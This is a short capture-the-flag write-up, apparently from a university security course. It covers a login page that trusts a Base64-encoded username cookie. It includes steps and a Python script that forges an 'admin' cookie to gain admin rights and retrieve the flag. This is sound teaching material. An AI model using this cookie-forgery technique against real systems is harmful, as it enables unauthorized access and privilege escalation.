# Challenge `Secure by Design` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to username manipulation, as it is stored on a cookie

- Where: Where is the vulnerability present
  - `http://mustard.stt.rnl.tecnico.ulisboa.pt:23056` login page

- Impact: What results of exploiting this vulnerability
  - Allows any user to gain admin privileges, since the username "admin" is tied to `admin` previleges

## Steps to reproduce

1. Convert the username `admin` to `Base64`
2. Create a cookie with the pair `"user":encoded_admin`
3. Access http://mustard.stt.rnl.tecnico.ulisboa.pt:23056, sending the cookie, to get the flag

The code used was the following:

```py
  import requests
  import base64
  import re

  encoded_admin = base64.b64encode("admin".encode('utf-8')).decode('utf-8')
  cookie = {'user': encoded_admin}

  res = requests.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23056", cookies=cookie)

  print(res.text)
```
